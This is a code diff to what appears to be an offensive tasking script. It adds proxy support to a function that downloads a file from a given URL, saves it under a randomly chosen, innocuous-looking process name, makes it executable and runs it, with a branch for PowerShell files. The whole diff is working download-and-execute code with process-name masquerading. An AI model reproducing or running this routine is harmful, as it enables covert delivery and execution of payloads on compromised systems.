@@ -11,7 +11,7 @@ def get_parent_process(process_name):
             return cur_proc['ppid']
 
 
-def http_get_and_execute(url):
+def http_get_and_execute(url, proxy):
     # Get random process name
     platform = sys.get_os()["platform"]
     proc_name = PROC_NAMES[platform][random.int(
@@ -26,7 +26,7 @@ def http_get_and_execute(url):
         print(f"Downloading {url} to {proc_path}{proc_name}")
 
         # Download
-        http.download(url, f"{proc_path}{proc_name}")
+        http.download(url, f"{proc_path}{proc_name}", None, proxy)
         sys.shell(f"chmod +x {proc_path}{proc_name}")
         # Execute
         sys.exec(f"{proc_path}{proc_name}", [], True)
@@ -50,7 +50,7 @@ def http_get_and_execute(url):
 
         # Download
         print(f"Downloading {url} to {proc_path}{proc_name}{ext}")
-        http.download(url, f"{proc_path}{proc_name}{ext}")
+        http.download(url, f"{proc_path}{proc_name}{ext}", None, proxy)
 
         # Execute
         if ext == ".ps1":
@@ -66,4 +66,7 @@ def http_get_and_execute(url):
         return
 
 
-http_get_and_execute(input_params['url'])
+proxy = input_params.get('proxy', '')
+if proxy == '':
+    proxy = None
+http_get_and_execute(input_params['url'], proxy)
